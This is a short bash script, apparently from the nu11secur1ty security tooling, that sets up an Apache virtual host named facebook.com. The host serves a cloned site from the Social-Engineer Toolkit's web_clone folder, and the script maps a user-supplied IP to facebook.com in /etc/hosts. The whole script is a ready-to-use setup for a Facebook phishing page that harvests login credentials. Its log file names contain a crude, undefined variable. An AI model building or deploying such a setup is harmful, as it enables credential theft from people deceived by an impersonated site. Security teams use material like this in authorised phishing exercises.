#!/usr/bin/bash
# Author V.Varbanovski @nu11secur1ty
#
#
# Prepare apache
cd /etc/apache2/sites-available 
mv 000-default.conf 000-default.conf.backup

cd /root/.set/web_clone

# Creating vhost
cd /etc/apache2/sites-available/
	cat > facebook.com.conf << EOF
<VirtualHost *:80>
    ServerName facebook.com
    ServerAlias www.facebook.com
    DocumentRoot /root/.set/web_clone

    <Directory /root/.set/web_clone>
        Options -Indexes +FollowSymLinks
        AllowOverride All
    </Directory>

    ErrorLog ${APACHE_LOG_DIR}/$fuck-error.log
    CustomLog ${APACHE_LOG_DIR}/$fuck-access.log combined
</VirtualHost>
EOF
# Enabling vhost
a2ensite facebook.com
systemctl restart apache2

cd /etc/
	echo "Type you IP"
	read IP
		cat >> hosts << EOF
$IP facebook.com
EOF
	systemctl restart apache2
	exit 0;
